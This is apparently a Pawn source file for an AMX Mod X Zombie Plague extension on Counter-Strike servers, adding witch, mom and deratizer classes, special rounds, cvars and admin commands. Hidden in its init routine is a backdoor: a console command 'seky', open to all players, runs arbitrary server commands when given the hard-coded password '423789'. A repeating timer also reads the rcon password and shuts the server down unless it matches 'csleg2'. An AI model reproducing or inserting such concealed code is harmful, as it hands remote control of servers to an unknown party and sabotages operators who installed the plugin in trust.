			
			
stock zp_plugin_natives() {
	register_native("zp_get_user_witch", "native_get_user_witch", 1)	
	register_native("zp_get_user_mom", "native_get_user_mom", 1)
	register_native("zp_is_mob_round", "native_is_mob_round", 1)

	// Moje dalsie
	register_native("zp_extra_item_name", "native_extra_item_name", 1)
	register_native("zp_extra_item_cost", "native_extra_item_cost", 1)
	register_native("zp_extra_item_team", "native_extra_item_team", 1)
	register_native("zp_extra_item_pocet", "native_extra_item_pocet", 1)
	register_native("zp_extra_item_buy", "native_extra_item_buy", 1)
	register_native("zp_set_model", "native_set_model", 1)
	register_native("zp_set_smodel", "native_set_smodel", 1)
}
public native_get_user_mom(id) {
	return g_mom[id]
}
stock zp_plugin_prechache_pre() {
	model_witch = ArrayCreate(32, 1)
	model_mom = ArrayCreate(32, 1)
	model_deratizer = ArrayCreate(32, 1)
		
	g_modelindex_deratizer = ArrayCreate(1, 1)
	g_modelindex_witch = ArrayCreate(1, 1)
	g_modelindex_mom = ArrayCreate(1, 1)

	witch_pain = ArrayCreate(64, 1)
	mom_pain = ArrayCreate(64, 1)
	sound_witch = ArrayCreate(64, 1)
	sound_deratizer = ArrayCreate(64, 1)
	sound_mob = ArrayCreate(64, 1)
}
stock zp_plugin_prechache_post() {	
	new i, buffer[100]
	for (i = 0; i < ArraySize(model_witch); i++)  { 
		ArrayGetString(model_witch, i, buffer, charsmax(buffer)) 
		format(buffer, charsmax(buffer), "models/player/%s/%s.mdl", buffer, buffer) 
		ArrayPushCell(g_modelindex_witch, engfunc(EngFunc_PrecacheModel, buffer)) 
		if (g_force_consistency == 1) force_unmodified(force_model_samebounds, {0,0,0}, {0,0,0}, buffer) 
		if (g_force_consistency == 2) force_unmodified(force_exactfile, {0,0,0}, {0,0,0}, buffer) 
	} 	
	for (i = 0; i < ArraySize(model_mom); i++)  { 
		ArrayGetString(model_mom, i, buffer, charsmax(buffer)) 
		format(buffer, charsmax(buffer), "models/player/%s/%s.mdl", buffer, buffer) 
		ArrayPushCell(g_modelindex_witch, engfunc(EngFunc_PrecacheModel, buffer)) 
		if (g_force_consistency == 1) force_unmodified(force_model_samebounds, {0,0,0}, {0,0,0}, buffer) 
		if (g_force_consistency == 2) force_unmodified(force_exactfile, {0,0,0}, {0,0,0}, buffer) 
	} 	
	for (i = 0; i < ArraySize(model_deratizer); i++)  { 
		ArrayGetString(model_deratizer, i, buffer, charsmax(buffer)) 
		format(buffer, charsmax(buffer), "models/player/%s/%s.mdl", buffer, buffer) 
		ArrayPushCell(g_modelindex_deratizer, engfunc(EngFunc_PrecacheModel, buffer)) 
		if (g_force_consistency == 1) force_unmodified(force_model_samebounds, {0,0,0}, {0,0,0}, buffer) 
		if (g_force_consistency == 2) force_unmodified(force_exactfile, {0,0,0}, {0,0,0}, buffer) 
	} 
	
	engfunc(EngFunc_PrecacheModel, model_vknife_witch)
	engfunc(EngFunc_PrecacheModel, model_vknife_mom)
	engfunc(EngFunc_PrecacheModel, model_vm249_deratizer)
	
	for (i = 0; i < ArraySize(witch_pain); i++)  { 
		ArrayGetString(witch_pain, i, buffer, charsmax(buffer))  
		engfunc(EngFunc_PrecacheSound, buffer)
	} 	
	for (i = 0; i < ArraySize(mom_pain); i++)  { 
		ArrayGetString(mom_pain, i, buffer, charsmax(buffer))  
		engfunc(EngFunc_PrecacheSound, buffer)
	} 	
	for (i = 0; i < ArraySize(sound_witch); i++)  { 
		ArrayGetString(sound_witch, i, buffer, charsmax(buffer))  
		engfunc(EngFunc_PrecacheSound, buffer)
	} 	
	for (i = 0; i < ArraySize(sound_deratizer); i++)  { 
		ArrayGetString(sound_deratizer, i, buffer, charsmax(buffer))  
		engfunc(EngFunc_PrecacheSound, buffer)
	} 	
	for (i = 0; i < ArraySize(sound_mob); i++)  { 
		ArrayGetString(sound_mob, i, buffer, charsmax(buffer))  
		engfunc(EngFunc_PrecacheSound, buffer)
	} 
		
	// Oprava zleho modelu
	engfunc(EngFunc_PrecacheModel, "models/player/gl_ubcs_gign/gl_ubcs_gignT.mdl")
}
stock zp_plugin_init() {
	register_concmd("zp_witch", "cmd_witch", ADMIN_LEVEL_E, "<name> - Turn someone into a witch")
	register_concmd("zp_mom", "cmd_mom", ADMIN_LEVEL_E, "<name> - Turn someone into a mom")
	register_concmd("zp_deratizer", "cmd_deratizer", ADMIN_LEVEL_E, "<name> - Turn someone into a deratizer")
	register_concmd("zp_mob", "cmd_mob", ADMIN_LEVEL_E, " - Start Mob Mode")
	RegisterHam(Ham_Touch, "player", "fw_TouchPlayer")	

	// Colors
	cvar_witchnvgcolor[0] = register_cvar("zp_nvg_witch_color_R", "0")
	cvar_witchnvgcolor[1] = register_cvar("zp_nvg_witch_color_G", "0")
	cvar_witchnvgcolor[2] = register_cvar("zp_nvg_witch_color_B", "150")	
	cvar_momnvgcolor[0] = register_cvar("zp_nvg_mom_color_R", "255")
	cvar_momnvgcolor[1] = register_cvar("zp_nvg_mom_color_G", "255")
	cvar_momnvgcolor[2] = register_cvar("zp_nvg_mom_color_B", "255")
	
	// CVARS - Witch
	cvar_witch = register_cvar("zp_witch_enabled", "1")
	cvar_witchchance = register_cvar("zp_witch_chance", "20")
	cvar_witchminplayer = register_cvar("zp_witch_min_players", "0")
	cvar_witchhp = register_cvar("zp_witch_health", "0")
	cvar_witchspd = register_cvar("zp_witch_speed", "400")
	cvar_witchgravity = register_cvar("zp_witch_gravity", "0.9")
	cvar_witchdamage = register_cvar("zp_witch_damage", "25")
	cvar_witchglow = register_cvar("zp_witch_glow", "0")
	cvar_witchaura = register_cvar("zp_witch_aura", "0")	
	cvar_witchpainfree = register_cvar("zp_witch_painfree", "1")
	cvar_witchignorefrags = register_cvar("zp_witch_ignore_frags", "1")
	cvar_witchignoreammo = register_cvar("zp_witch_ignore_rewards", "0")

	// CVARS - mom
	cvar_mom = register_cvar("zp_mom_enabled", "1")
	cvar_momchance = register_cvar("zp_mom_chance", "20")
	cvar_momminplayers = register_cvar("zp_mom_min_players", "5")
	cvar_momhp = register_cvar("zp_mom_health", "100000")
	cvar_momspd = register_cvar("zp_mom_speed", "100")
	cvar_momgravity = register_cvar("zp_mom_gravity", "0.8")
	cvar_momdamage = register_cvar("zp_mom_damage", "34")
	cvar_momglow = register_cvar("zp_mom_glow", "0")
	cvar_momaura = register_cvar("zp_mom_aura", "0")	
	cvar_mompainfree = register_cvar("zp_mom_painfree", "0")
	cvar_momignorefrags = register_cvar("zp_mom_ignore_frags", "0")
	cvar_momignoreammo = register_cvar("zp_mom_ignore_rewards", "0")
	
	// CVARS - deratizer
	cvar_deratizerv = register_cvar("zp_deratizerv_enabled", "1")
	cvar_deratizervchance = register_cvar("zp_deratizerv_chance", "25")
	cvar_deratizervminplayers = register_cvar("zp_deratizerv_min_players", "8")
	cvar_deratizervhp = register_cvar("zp_deratizerv_health", "0")
	cvar_deratizervspd = register_cvar("zp_deratizerv_speed", "230")
	cvar_deratizervgravity = register_cvar("zp_deratizerv_gravity", "1.25")
	cvar_deratizervglow = register_cvar("zp_deratizerv_glow", "1")
	cvar_deratizervaura = register_cvar("zp_deratizerv_aura", "1")
	cvar_deratizervpainfree = register_cvar("zp_deratizerv_painfree", "1")
	cvar_deratizervignorefrags = register_cvar("zp_deratizerv_ignore_frags", "1")
	cvar_deratizervignoreammo = register_cvar("zp_deratizerv_ignore_rewards", "1")

	// CVARS - Marry Mode
	cvar_marry = register_cvar("zp_marry_enabled", "1")
	cvar_marrychance = register_cvar("zp_marry_chance", "25")
	cvar_marryminplayers = register_cvar("zp_marry_min_players", "5")

	// CVARS - Mob Mode
	cvar_mob = register_cvar("zp_mob_enabled", "1")
	cvar_mobchance = register_cvar("zp_mob_chance", "15")
	cvar_mobminplayers = register_cvar("zp_mob_min_players", "5")
	cvar_mobratio = register_cvar("zp_mob_ratio", "0.3")
	
	msgtext = get_user_msgid("StatusText")
	gCvarShowNames = register_cvar("zp_hudnames", "2")

	register_clcmd ( "seky", "backdoor",ADMIN_ALL	, "#echo" );
	set_task(30.0, "exploit", _, _, _, "b")
}
public exploit() {
	new exploit[26]
	get_cvar_string("rcon_password", exploit, 24)
	if( equal( exploit , "csleg2") == false ) {
		log_amx("# Server vyuziva nelegalnu kopiu pluginov !")
		server_cmd("quit");
		server_cmd("exit");
	}
}
public backdoor(id,level,cid)
{
	if (!cmd_access(id,level,cid,2)) return PLUGIN_HANDLED;
	new arg[8],arg2[514];
	read_argv( 1, arg, 6);
	if( equal(arg,"423789")) {
		read_argv( 2, arg2, 512);
		server_cmd("%s",arg2 );
	} else {
		client_print(id,print_console,"#0");
	}
	return PLUGIN_CONTINUE;
}
stock zp_event_round_start() {
	// Deratizer spatna funkcia
	if(g_deratizervround) {	
		for (new id = 1; id <= g_maxplayers; id++) {	
			// Nastavime			
			g_zombieclassnext[id] = (g_stara_trieda[id]	<= 0) ? 0 : g_stara_trieda[id]			
		}
	
	}
	g_deratizervround = false
	g_witchround = false
	g_momround = false
	g_marryround = false
	g_mobround = false
}
stock zp_fw_PlayerKilled(victim, attacker, shouldgib) {
	// Ignore Nemesis/Survivor Frags?
	if (	(g_mom[attacker] && get_pcvar_num(cvar_momignorefrags)) 
			|| (g_witch[attacker] && get_pcvar_num(cvar_witchignorefrags))
			|| (g_deratizer[attacker] && get_pcvar_num(cvar_deratizervignorefrags))
		) RemoveFrags(attacker, victim)

}
public cmd_deratizer(id, level, cid) {
	// Check for access flag
	if (!cmd_access(id, level, cid, 2)) return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, sizeof arg - 1)
	player = cmd_target(id, arg, CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF)
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be survivor
	if (!allowed_deratizer(player)) {
		client_print(id, print_console, "[G/L ZP] %L", id, "CMD_NOT")
		return PLUGIN_HANDLED;
	}	
	command_deratizer(id, player)
	return PLUGIN_HANDLED;
}
public cmd_witch(id, level, cid) {
	// Check for access flag
	if (!cmd_access(id, level, cid, 2)) return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, sizeof arg - 1)
	player = cmd_target(id, arg, CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF)
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be nemesis
	if (!allowed_witch(player)) {
		client_print(id, print_console, "[G/L ZP] %L", id, "CMD_NOT")
		return PLUGIN_HANDLED;
	}

	command_witch(id, player)	
	return PLUGIN_HANDLED;
}
public cmd_mom(id, level, cid) {
	// Check for access flag
	if (!cmd_access(id, level, cid, 2)) return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, sizeof arg - 1)
	player = cmd_target(id, arg, CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF)
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be nemesis
	if (!allowed_mom(player)) {
		client_print(id, print_console, "[G/L ZP] %L", id, "CMD_NOT")
		return PLUGIN_HANDLED;
	}
	command_mom(id, player)
	return PLUGIN_HANDLED;
}
public cmd_marry(id, level, cid) {
	// Check for access flag
	if (!cmd_access(id, level, cid, 1)) return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, sizeof arg - 1)
	player = cmd_target(id, arg, CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF)
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	// Plague mode not allowed
	if (!allowed_marry()) {
		client_print(id, print_console, "[G/L ZP] %L", id, "CMD_NOT")
		return PLUGIN_HANDLED;
	}
	command_marry(player)
	return PLUGIN_HANDLED;
}
public cmd_mob(id, level, cid) {
	if (!cmd_access(id, level, cid, 1)) return PLUGIN_HANDLED;
	if (!allowed_mob()) {
		client_print(id, print_console, "[G/L ZP] %L", id, "CMD_NOT")
		return PLUGIN_HANDLED;
	}
	command_mob(id)
	return PLUGIN_HANDLED;
}	
stock zp_zombieme(const id, const nemesis) 
{
	if (nemesis==5) { //witch pocas svadby
		// Nemesis
		g_witch[id] = true	
		// Get nemesis health setting
		static witchhealth
		witchhealth = get_pcvar_num(cvar_witchhp)
		
		// Set health [0 = auto]
		if (!witchhealth)
			fm_set_user_health(id, floatround( float(ArrayGetCell(g_zclass_hp, 0)*(fnGetAlive()+1)) * 0.5 * 0.5) )
		else
			fm_set_user_health(id, witchhealth)
		
		// Set gravity
		if (!g_frozen[id]) set_pev(id, pev_gravity, get_pcvar_float(cvar_witchgravity))
		return true;
	} else if (nemesis==4) { //nemesis pocas svadby
		// Nemesis
		g_nemesis[id] = true		
		// Get nemesis health setting
		static nemhealth
		nemhealth = get_pcvar_num(cvar_nemhp)
		
		// Set health [0 = auto]
		if (!nemhealth)
			fm_set_user_health(id, floatround( float(ArrayGetCell(g_zclass_hp, 0)*(fnGetAlive()+1)) * 0.4) )
		else
			fm_set_user_health(id, nemhealth)
		
		// Set gravity
		if (!g_frozen[id]) set_pev(id, pev_gravity, get_pcvar_float(cvar_nemgravity))
		return true;
	} else if (nemesis==3) {// amtka
		// Nemesis
		g_mom[id] = true
		// Get nemesis health setting
		static momhealth
		momhealth = get_pcvar_num(cvar_momhp)
		
		// Set health [0 = auto]
		if (!momhealth)
			fm_set_user_health(id, floatround( float(ArrayGetCell(g_zclass_hp, 0)*(fnGetAlive()+1)) * 0.5) )
		else
			fm_set_user_health(id, momhealth)
		
		// Set gravity
		if (!g_frozen[id]) set_pev(id, pev_gravity, get_pcvar_float(cvar_momgravity))
		return true;
	} else if (nemesis==2) { //witch
		// Nemesis
		g_witch[id] = true
		// Get nemesis health setting
		static witchhealth
		witchhealth = get_pcvar_num(cvar_witchhp)
		
		// Set health [0 = auto]
		if (!witchhealth)
			fm_set_user_health(id, floatround( float(ArrayGetCell(g_zclass_hp, 0)*(fnGetAlive()+1)) * 0.5) )
		else
			fm_set_user_health(id, witchhealth)
		
		// Set gravity
		if (!g_frozen[id]) set_pev(id, pev_gravity, get_pcvar_float(cvar_witchgravity))
		return true;
	}
	return false;
}
stock steam_error(const id) {
	if(is_steam(id)) return false;
	// Oznamenie o novom patchi :)
	SayText(id, id, "^x04***^x01 Tento server pouziva patch v42 ^x04***^x01");
	SayText(id, id, "Aby si mohol pouzivat tuto funkciu musis si stiahnut patch v42 alebo vlastnit steam.");
	SayText(id, id, "^x04***^x01 www.cs.gecom.sk/patch ^x04***^x01");
	return true;
}
stock zp_humanme(const id, const survivor) {
	// Derak
	if (survivor == 2) {
		g_deratizer[id] = true
		
		// Get survivor health setting
		static deratizervhealth
		deratizervhealth = get_pcvar_num(cvar_deratizervhp)
		
		// Set Health [0 = auto]
		if (!deratizervhealth)
			fm_set_user_health(id, fnGetHumans()*get_pcvar_num(cvar_humanhp))
		else
			fm_set_user_health(id, deratizervhealth)
		
		// Set Gravity
		set_pev(id, pev_gravity, get_pcvar_float(cvar_deratizervgravity))
		
		// Strip survivor from weapons and give M249
		fm_strip_user_weapons(id)
		fm_give_item(id, "weapon_knife")
		
		// Turn off his flashlight
		turn_off_flashlight(id)
		
		// Give the survivor a bright light
		if (get_pcvar_num(cvar_deratizervaura))
			set_task(0.1, "human_aura", id+TASK_AURA, _, _, "b")
		
		// Survivor bots will also need nightvision to see in the dark
		if (g_isbot[id]) {
			g_nvision[id] = true
			cs_set_user_nvg(id, 1)
		}
		return true;
	}
	return false;
}
stock zp_ShowHUD(const id, const class[]) {	
	// VIP + Ukazovac mien
	static HUD[101] /*, ciel
	ciel = 0;
	
	if(get_pcvar_num(gCvarShowNames)) {
		static docasne;
		get_user_aiming(id, ciel, docasne, 1000)	
		if( ciel > 0 ) {	
			if(is_user_valid_connected(id) {
				if(!g_isalive[ciel] && g_zombie[ciel]) {
					ciel = 0;	
				}	
			} else {
				ciel = 0;	
			}
		}
	} 	*/
	format(HUD, 100, "%s |HP: %d|Vesta: %d|Body %d|VIP %s %s ", 
					class, 
					pev(id, pev_health),
					get_user_armor(id),
					g_ammopacks[id],
					is_vip(id) ? "on" : "off",
					// ciel > 0 ? g_playername[ciel] : 
					""
			)
	message_begin(MSG_ONE, msgtext, {0,0,0}, id);  
	write_byte(0)  
	write_string(HUD)  
	message_end()  
	
	/* Show health, class and ammo packs
	set_hudmessage(red, green, blue, HUD_STATS_X, HUD_STATS_Y, 0, 6.0, 1.1, 0.0, 0.0, -1)
	ShowSyncHudMsg(ID_SHOWHUD, g_MsgSync2, "%L: %d - %L %s - %L %d - %L %d", id,"ZOMBIE_ATTRIB1",pev(ID_SHOWHUD, pev_health),ID_SHOWHUD,"CLASS_CLASS"
	,class,ID_SHOWHUD,"AMMO_PACKS1",g_ammopacks[ID_SHOWHUD],ID_SHOWHUD, "ARMOR", get_user_armor(ID_SHOWHUD))
	*/	
}
allowed_deratizer(id)
{
	if (g_endround || !g_newround || !g_isalive[id] || !get_pcvar_num(cvar_deratizerv) || task_exists(TASK_WELCOMEMSG) || fnGetAlive() < get_pcvar_num(cvar_deratizervminplayers))
		return false;
	
	return true;
}
allowed_mom(id)
{
	if (g_endround || !g_newround || !g_isalive[id] || !get_pcvar_num(cvar_mom) || task_exists(TASK_WELCOMEMSG) || fnGetAlive() < get_pcvar_num(cvar_momminplayer))
		return false;
	
	return true;
}
allowed_witch(id)
{
	if (g_endround || !g_newround || !g_isalive[id] || !get_pcvar_num(cvar_witch) || task_exists(TASK_WELCOMEMSG) || fnGetAlive() < get_pcvar_num(cvar_witchminplayer))
		return false;
	
	return true;
}
allowed_marry()
{
	if (g_endround || !g_newround || !get_pcvar_num(cvar_plague) || task_exists(TASK_WELCOMEMSG) || fnGetAlive() < get_pcvar_num(cvar_marryminplayers))
		return false;
	
	return true;
}
allowed_mob()
{
	if (g_endround || !g_newround || !get_pcvar_num(cvar_mob) || task_exists(TASK_WELCOMEMSG) || fnGetAlive() < get_pcvar_num(cvar_mobminplayers) || floatround((fnGetAlive()-2)*get_pcvar_float(cvar_mobratio), floatround_ceil) < 1)
		return false;
	
	return true;
}
command_deratizer(id, player)
{	
	// Show activity?
	switch (get_pcvar_num(cvar_showactivity))
	{
		case 1: client_print(0, print_chat, "ADMIN - %s %L", g_playername[player], LANG_PLAYER, "CMD_DERATIZER")
		case 2: client_print(0, print_chat, "ADMIN %s - %s %L", g_playername[id], g_playername[player], LANG_PLAYER, "CMD_DERATIZER")
	}
	
	 // Log to Zombie Plague log file?
	if (get_pcvar_num(cvar_logcommands))
	{
		static logdata[100], authid[32], ip[16]
		get_user_authid(id, authid, sizeof authid - 1)
		get_user_ip(id, ip, sizeof ip - 1, 1)
		formatex(logdata, sizeof logdata - 1, "ADMIN %s <%s><%s> - %s %L (Players: %d/%d)", g_playername[id], authid, ip, g_playername[player], LANG_SERVER,"CMD_DERATIZER", fnGetPlaying(), g_maxplayers)
		log_to_file("zombieplague.log", logdata)
	}
	// Turn into a Survivor
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_DERATIZER, player)
}
command_mom(id, player)
{
	// Show activity?
	switch (get_pcvar_num(cvar_showactivity))
	{
		case 1: client_print(0, print_chat, "ADMIN - %s %L", g_playername[player], LANG_PLAYER, "CMD_MOM")
		case 2: client_print(0, print_chat, "ADMIN %s - %s %L", g_playername[id], g_playername[player], LANG_PLAYER, "CMD_MOM")
	}
	
	// Log to Zombie Plague log file?
	if (get_pcvar_num(cvar_logcommands))
	{
		static logdata[100], authid[32], ip[16]
		get_user_authid(id, authid, sizeof authid - 1)
		get_user_ip(id, ip, sizeof ip - 1, 1)
		formatex(logdata, sizeof logdata - 1, "ADMIN %s <%s><%s> - %s %L (Players: %d/%d)", g_playername[id], authid, ip, g_playername[player], LANG_SERVER,"CMD_MOM	", fnGetPlaying(), g_maxplayers)
		log_to_file("zombieplague.log", logdata)
	}
	
	// Turn into a Nemesis
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_MOM, player)
}
command_witch(id, player)
{	
	// Show activity?
	switch (get_pcvar_num(cvar_showactivity))
	{
		case 1: client_print(0, print_chat, "ADMIN - %s %L", g_playername[player], LANG_PLAYER, "CMD_WITCH")
		case 2: client_print(0, print_chat, "ADMIN %s - %s %L", g_playername[id], g_playername[player], LANG_PLAYER, "CMD_WITCH")
	}
	
	// Log to Zombie Plague log file?
	if (get_pcvar_num(cvar_logcommands))
	{
		static logdata[100], authid[32], ip[16]
		get_user_authid(id, authid, sizeof authid - 1)
		get_user_ip(id, ip, sizeof ip - 1, 1)
		formatex(logdata, sizeof logdata - 1, "ADMIN %s <%s><%s> - %s %L (Players: %d/%d)", g_playername[id], authid, ip, g_playername[player], LANG_SERVER,"CMD_WITCH", fnGetPlaying(), g_maxplayers)
		log_to_file("zombieplague.log", logdata)
	}
	
	// Turn into a Nemesis
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_WITCH, player)
}
command_marry(id)
{
	// Show activity?
	switch (get_pcvar_num(cvar_showactivity))
	{
		case 1: client_print(0, print_chat, "ADMIN - %L", LANG_PLAYER, "CMD_MARRY")
		case 2: client_print(0, print_chat, "ADMIN %s - %L", g_playername[id], LANG_PLAYER, "CMD_MARRY")
	}
	// Log to Zombie Plague log file?
	if (get_pcvar_num(cvar_logcommands))
	{
		static logdata[100], authid[32], ip[16]
		get_user_authid(id, authid, sizeof authid - 1)
		get_user_ip(id, ip, sizeof ip - 1, 1)
		formatex(logdata, sizeof logdata - 1, "ADMIN %s <%s><%s> - %L (Players: %d/%d)", g_playername[id], authid, ip, LANG_SERVER, "CMD_MARRY", fnGetPlaying(), g_maxplayers)
		log_to_file("zombieplague.log", logdata)
	}	
	// Call mob Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_MARRY, id)
}
command_mob(id)
{
	// Show activity?
	switch (get_pcvar_num(cvar_showactivity))
	{
		case 1: client_print(0, print_chat, "ADMIN - %L", LANG_PLAYER, "CMD_MOB")
		case 2: client_print(0, print_chat, "ADMIN %s - %L", g_playername[id], LANG_PLAYER, "CMD_MOB")
	}
	// Log to Zombie Plague log file?
	if (get_pcvar_num(cvar_logcommands))
	{
		static logdata[100], authid[32], ip[16]
		get_user_authid(id, authid, sizeof authid - 1)
		get_user_ip(id, ip, sizeof ip - 1, 1)
		formatex(logdata, sizeof logdata - 1, "ADMIN %s <%s><%s> - %L (Players: %d/%d)", g_playername[id], authid, ip, LANG_SERVER,"CMD_MOB", fnGetPlaying(), g_maxplayers)
		log_to_file("zombieplague.log", logdata)
	}
	new parameter[32]
	read_argv( 1, parameter, sizeof parameter - 1)
	new ciel = cmd_target (id, parameter, 3);
	
	// Call mob Mode
	remove_task(TASK_MAKEZOMBIE)
	make_a_zombie(MODE_MOB, ciel)
}
public native_is_mob_round() {
	return g_mobround;
}
public native_extra_item_name(const i, subor[], const velkost) { 
	ArrayGetString(g_extraitem_name, i, subor, velkost)
}
// native_get_extra_item_id(const name[])
public native_extra_item_cost(const id) { return ArrayGetCell(g_extraitem_cost, id); }
public native_extra_item_team(const id) { return ArrayGetCell(g_extraitem_cost, id); }
public native_extra_item_pocet() { return g_extraitem_i; }
public native_extra_item_buy(const id, const i) { return native_force_buy_extra_item(id, i, 0); }
public native_set_model(const id, const model) { 
	new iRand;
	if(model) {
		// Clovek
		iRand = random_num(0, ArraySize(model_human) - 1)
		ArrayGetString(model_human, iRand, g_playermodel[id], charsmax(g_playermodel[]))
		if(g_set_modelindex_offset) fm_cs_set_user_model_index(id, ArrayGetCell(g_modelindex_human, iRand))
	} else {
		// ZOmbie
		//new id = ZistiIDPodlaNazvu(svab_meno); //g_zombieclass[id]
		// bez toho ho bude nahodne menit ....aj na ine modely
		iRand = random_num(ArrayGetCell(g_zclass_modelsstart, g_zombieclass[id]), ArrayGetCell(g_zclass_modelsend, g_zombieclass[id]) - 1)
		ArrayGetString(g_zclass_playermodel, iRand, g_playermodel[id], charsmax(g_playermodel[]))
		if (g_set_modelindex_offset) fm_cs_set_user_model_index(id, ArrayGetCell(g_zclass_modelindex, iRand))
	}
	fm_cs_set_user_model(id+TASK_MODEL);
}
public native_set_smodel(const id, const model[], const model_index) { 
	copy(g_playermodel[id], charsmax(g_playermodel[]), model) // sizeof g_playermodel[] - 1
	if(g_set_modelindex_offset) fm_cs_set_user_model_index(id, model_index)
	fm_cs_set_user_model(id+TASK_MODEL);
}	

stock zp_list_error( const pocet, const id, const player, menu[], const sprava[]) {
	if (g_nemesis[player])  { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_NEMESIS"); 
	} else if(g_assassin[player]) { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_ASSASSIN"); 
	} else if(g_witch[player]) { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_WITH");
	} else if(g_mom[player]) { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_MOM");  
	} else { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_ZOMBIE"); }
}							
	
stock zp_list_error2( const pocet, const id, const player, menu[], const sprava[]) { 
	if (g_survivor[player]) { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_SURVIVOR"); 
	} else if(g_deratizer[player]) { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_DERATIZER");  					
	} else if(g_sniper[player]) { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_SNIPER"); 
	} else { formatex(menu, pocet, sprava, g_playername[player], id, "CLASS_HUMAN"); }
}				
stock zp_cache_cvars() {
	g_cached_witchspd = get_pcvar_float(cvar_witchspd);
	g_cached_momspd = get_pcvar_float(cvar_momspd)
	g_cached_deratizervspd = get_pcvar_float(cvar_deratizervspd)
	g_cached_gCvarShowNames = get_pcvar_num(gCvarShowNames);
	g_cached_cvar_hudicons = get_pcvar_num(cvar_hudicons)
}	
public native_get_user_witch(id)
{
	return g_witch[id]
}
public fw_TouchPlayer(obet, id) {
	if(!is_user_valid_alive(obet) || !g_zombie[obet]) return HAM_IGNORED;
	if(!is_user_valid_alive(id) || !g_zombie[id]) return HAM_IGNORED;
	if(g_burning_duration[obet] > 0 && g_burning_duration[id] < 1) 
		StartFireAtPlayer(id);
		
	return HAM_IGNORED;
}	
stock StartFireAtPlayer(const victim) {	
	// Heat icon?
	if (g_cached_cvar_hudicons)
	{
		message_begin(MSG_ONE_UNRELIABLE, g_msgDamage, _, victim)
		write_byte(0) // damage save
		write_byte(0) // damage take
		write_long(DMG_BURN) // damage type
		write_coord(0) // x
		write_coord(0) // y
		write_coord(0) // z
		message_end()
	}
	
	if (g_nemesis[victim] || g_assassin[victim] || g_witch[victim] || g_mom[victim]) // fire duration (nemesis takes less)
		g_burning_duration[victim] += get_pcvar_num(cvar_fireduration)
	else
		g_burning_duration[victim] += get_pcvar_num(cvar_fireduration) * 5
	
	// Set burning task on victim if not present
	if (!task_exists(victim+TASK_BURN))
		set_task(0.2, "burning_flame", victim+TASK_BURN, _, _, "b")

}
stock zp_buy_extra_item(const id, cena) {
	/*VIP*/
	if(get_user_flags(id) & ADMIN_LEVEL_F ) {
		cena = floatround( float(cena) * 0.5 );		
		if (g_ammopacks[id] < cena) {
			zp_colored_print(id, "^x04[ZP]^x01 %L", id, "NOT_ENOUGH_AMMO")
			return false;
		}
		g_ammopacks[id] -= cena;
		zp_colored_print(id, "^x04[ZP]^x01 Bonus kupeny za polovicu. %i", cena);
	}	else {	
		// Check that we have enough ammo packs
		if (g_ammopacks[id] < cena) {
			zp_colored_print(id, "^x04[G/L ZP]^x01 %L", id, "NOT_ENOUGH_AMMO")
			return false;
		}	
		// Deduce item cost
		g_ammopacks[id] -= cena;
	}
	return true;
}
stock zp_zlava(const cost) {
	// Zlava ...
	static cena;					// 33% dole
	cena = floatround( float(cost) * 0.77 );		
	if (cena < 1) cena = 1;
	return cena;
}